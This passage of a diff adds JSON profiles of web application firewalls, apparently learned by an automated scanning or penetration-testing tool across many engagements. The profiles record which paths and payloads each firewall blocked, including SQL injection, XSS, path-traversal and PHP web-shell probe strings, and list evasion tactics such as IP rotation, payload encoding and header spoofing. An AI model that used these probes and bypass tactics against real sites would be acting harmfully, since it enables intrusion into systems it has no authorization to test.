+        "path_normalization",
+        "ip_rotation",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_2b07106a_1779853881": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_2b07106a",
+      "discovered_at": 1779853881.2742014,
+      "evasion_tactics": [
+        "http_method_variation",
+        "url_encoding",
+        "path_normalization"
+      ]
+    },
+    "learned_waf_eng_736a5527_1779854892": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_736a5527",
+      "discovered_at": 1779854892.5738878,
+      "evasion_tactics": [
+        "url_encoding",
+        "comment_injection",
+        "proxy_rotation",
+        "path_normalization",
+        "http_method_variation",
+        "payload_encoding",
+        "ip_rotation"
+      ]
+    },
+    "learned_waf_eng_9f2047d7_1779855110": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_9f2047d7",
+      "discovered_at": 1779855110.3848853,
+      "evasion_tactics": [
+        "url_encoding",
+        "path_normalization",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_d3ed949d_1779856803": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_d3ed949d",
+      "discovered_at": 1779856803.0014925,
+      "evasion_tactics": [
+        "url_encoding",
+        "ip_rotation",
+        "path_normalization",
+        "proxy_rotation",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_a9b5c7ee_1779875377": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_a9b5c7ee",
+      "discovered_at": 1779875377.1517382,
+      "evasion_tactics": [
+        "proxy_rotation",
+        "url_encoding",
+        "path_normalization",
+        "ip_rotation",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_d4fc1132_1779876018": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_d4fc1132",
+      "discovered_at": 1779876018.5077167,
+      "evasion_tactics": [
+        "url_encoding",
+        "path_normalization",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_fc4eeb90_1779878382": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_fc4eeb90",
+      "discovered_at": 1779878382.8818247,
+      "evasion_tactics": [
+        "payload_encoding",
+        "url_encoding",
+        "ip_rotation",
+        "comment_injection",
+        "path_normalization",
+        "http_method_variation",
+        "proxy_rotation"
+      ]
+    },
+    "learned_waf_eng_0a80334d_1779906616": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_0a80334d",
+      "discovered_at": 1779906616.7283869,
+      "evasion_tactics": [
+        "url_encoding",
+        "http_method_variation",
+        "ip_rotation",
+        "proxy_rotation",
+        "payload_encoding",
+        "path_normalization",
+        "comment_injection"
+      ]
+    },
+    "learned_waf_eng_ac65e618_1779949212": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_ac65e618",
+      "discovered_at": 1779949212.6601331,
+      "evasion_tactics": [
+        "ip_rotation",
+        "proxy_rotation",
+        "http_method_variation",
+        "payload_encoding",
+        "url_encoding",
+        "comment_injection",
+        "path_normalization"
+      ]
+    },
+    "learned_waf_eng_5e7b6581_1779952374": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "payload_detection"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_5e7b6581",
+      "discovered_at": 1779952374.572438,
+      "evasion_tactics": [
+        "comment_injection",
+        "http_method_variation",
+        "payload_encoding"
+      ]
+    },
+    "learned_waf_eng_515cdb59_1779960475": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_515cdb59",
+      "discovered_at": 1779960475.8344452,
+      "evasion_tactics": [
+        "ip_rotation",
+        "comment_injection",
+        "path_normalization",
+        "url_encoding",
+        "http_method_variation",
+        "payload_encoding",
+        "proxy_rotation"
+      ]
+    },
+    "learned_waf_eng_c7195397_1779963593": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 6.34,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "consistent_delay"
+      },
+      "patterns": [
+        "response_delay",
+        "method_blocking",
+        "payload_detection",
+        "timing_detection"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_c7195397",
+      "discovered_at": 1779963593.0415552,
+      "evasion_tactics": [
+        "comment_injection",
+        "persistence",
+        "connection_pooling",
+        "timing_randomization",
+        "http_method_variation",
+        "payload_encoding",
+        "dummy_requests"
+      ]
+    },
+    "learned_waf_eng_88e66c86_1779965959": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_88e66c86",
+      "discovered_at": 1779965959.9447563,
+      "evasion_tactics": [
+        "path_normalization",
+        "proxy_rotation",
+        "ip_rotation",
+        "url_encoding",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_58a6fe27_1779992067": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_58a6fe27",
+      "discovered_at": 1779992067.1221814,
+      "evasion_tactics": [
+        "ip_rotation",
+        "comment_injection",
+        "path_normalization",
+        "proxy_rotation",
+        "payload_encoding",
+        "url_encoding",
+        "http_method_variation"
+      ]
+    },
+    "learned_waf_eng_599e84c0_1780034449": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_599e84c0",
+      "discovered_at": 1780034449.9355254,
+      "evasion_tactics": [
+        "url_encoding",
+        "path_normalization",
+        "ip_rotation",
+        "http_method_variation",
+        "proxy_rotation"
+      ]
+    },
+    "learned_waf_eng_acf06df3_1780035577": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.48,
+      "discovered_in": "eng_acf06df3",
+      "discovered_at": 1780035577.510812,
+      "evasion_tactics": [
+        "proxy_rotation",
+        "ip_rotation",
+        "http_method_variation",
+        "path_normalization",
+        "url_encoding"
+      ]
+    },
+    "learned_waf_eng_067e427d_1780046168": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_067e427d",
+      "discovered_at": 1780046168.448448,
+      "evasion_tactics": [
+        "url_encoding",
+        "http_method_variation",
+        "path_normalization"
+      ]
+    },
+    "learned_waf_eng_05bc6b10_1780049541": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_05bc6b10",
+      "discovered_at": 1780049541.4849932,
+      "evasion_tactics": [
+        "payload_encoding",
+        "proxy_rotation",
+        "path_normalization",
+        "http_method_variation",
+        "comment_injection",
+        "url_encoding",
+        "ip_rotation"
+      ]
+    },
+    "learned_waf_eng_1a53775a_1780157590": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_1a53775a",
+      "discovered_at": 1780157590.7975965,
+      "evasion_tactics": [
+        "comment_injection",
+        "path_normalization",
+        "ip_rotation",
+        "proxy_rotation",
+        "http_method_variation",
+        "payload_encoding",
+        "url_encoding"
+      ]
+    },
+    "learned_waf_eng_b07701f0_1780240201": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_b07701f0",
+      "discovered_at": 1780240201.7464745,
+      "evasion_tactics": [
+        "ip_rotation",
+        "http_method_variation",
+        "payload_encoding",
+        "proxy_rotation",
+        "url_encoding",
+        "comment_injection",
+        "path_normalization"
+      ]
+    },
+    "learned_waf_eng_b0f0727a_1780330480": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_b0f0727a",
+      "discovered_at": 1780330480.9953635,
+      "evasion_tactics": [
+        "payload_encoding",
+        "comment_injection",
+        "ip_rotation",
+        "path_normalization",
+        "url_encoding",
+        "http_method_variation",
+        "proxy_rotation"
+      ]
+    },
+    "learned_waf_eng_4bd01ad5_1780579057": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_4bd01ad5",
+      "discovered_at": 1780579057.9856176,
+      "evasion_tactics": [
+        "payload_encoding",
+        "proxy_rotation",
+        "comment_injection",
+        "path_normalization",
+        "ip_rotation",
+        "http_method_variation",
+        "url_encoding"
+      ]
+    },
+    "learned_waf_eng_ca44cc3d_1780596379": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_ca44cc3d",
+      "discovered_at": 1780596379.3235633,
+      "evasion_tactics": [
+        "url_encoding",
+        "proxy_rotation",
+        "comment_injection",
+        "path_normalization",
+        "payload_encoding",
+        "http_method_variation",
+        "ip_rotation"
+      ]
+    },
+    "learned_waf_eng_bcd077a0_1780741384": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_bcd077a0",
+      "discovered_at": 1780741384.2222328,
+      "evasion_tactics": [
+        "http_method_variation",
+        "payload_encoding",
+        "path_normalization",
+        "url_encoding",
+        "proxy_rotation",
+        "comment_injection",
+        "ip_rotation"
+      ]
+    },
+    "learned_waf_eng_e6729489_1780745360": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [
+          "CF-RAY"
+        ],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [],
+        "payload_patterns_blocked": [],
+        "ip_rotation_required": false,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "header_signature",
+        "method_blocking"
+      ],
+      "confidence": 0.36,
+      "discovered_in": "eng_e6729489",
+      "discovered_at": 1780745360.9269247,
+      "evasion_tactics": [
+        "header_rotation",
+        "http_method_variation",
+        "header_spoofing"
+      ]
+    },
+    "learned_waf_eng_62b88b9e_1780765267": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</script>",
+          "' or '1'='1",
+          "UNION SELECT",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_62b88b9e",
+      "discovered_at": 1780765267.4047058,
+      "evasion_tactics": [
+        "url_encoding",
+        "payload_encoding",
+        "path_normalization",
+        "proxy_rotation",
+        "http_method_variation",
+        "ip_rotation",
+        "comment_injection"
+      ]
+    },
+    "learned_waf_eng_056766fd_1780820657": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_056766fd",
+      "discovered_at": 1780820657.7090936,
+      "evasion_tactics": [
+        "path_normalization",
+        "payload_encoding",
+        "url_encoding",
+        "ip_rotation",
+        "proxy_rotation",
+        "http_method_variation",
+        "comment_injection"
+      ]
+    },
+    "learned_waf_eng_9f9fde75_e41f5afcc3a74876b7810f0e1678cd37": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/admin",
+          "/administrator",
+          "/wp-admin",
+          "/phpmyadmin",
+          "/.env",
+          "/.git",
+          "/.git/config",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_9f9fde75",
+      "discovered_at": 1780825560.6948736,
+      "evasion_tactics": [
+        "http_method_variation",
+        "proxy_rotation",
+        "comment_injection",
+        "path_normalization",
+        "ip_rotation",
+        "url_encoding",
+        "payload_encoding"
+      ]
+    },
+    "learned_waf_eng_d153f1bf_51f91edadd4048f8b49a88da762354e6": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403,
+          429
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "POST",
+          "PUT",
+          "DELETE",
+          "TRACE",
+          "PATCH"
+        ],
+        "path_patterns_blocked": [
+          "/wp-admin",
+          "/.gitignore"
+        ],
+        "payload_patterns_blocked": [
+          "<script>alert(1)</sc",
+          "' or '1'='1",
+          "union select",
+          "../../../etc/passwd",
+          "<?php system($_GET['"
+        ],
+        "ip_rotation_required": true,
+        "user_agent_sensitive": false,
+        "timing_pattern": "none"
+      },
+      "patterns": [
+        "method_blocking",
+        "path_blocking",
+        "payload_detection",
+        "ip_based_blocking"
+      ],
+      "confidence": 0.6,
+      "discovered_in": "eng_d153f1bf",
+      "discovered_at": 1780826624.4933972,
+      "evasion_tactics": [
+        "comment_injection",
+        "http_method_variation",
+        "proxy_rotation",
+        "ip_rotation",
+        "payload_encoding",
+        "path_normalization",
+        "url_encoding"
+      ]
+    },
+    "learned_waf_eng_6e9b44ba_37114f66f3ff41dc8058c3463881232e": {
+      "behaviors": {
+        "rate_limit_threshold": null,
+        "blocking_status_codes": [
+          403
+        ],
+        "blocking_headers": [],
+        "response_delay": 0,
+        "request_methods_blocked": [
+          "GET",
+          "POST",
+          "HEAD",
+          "OPTIONS",
+          "PUT",
+          "DELETE",
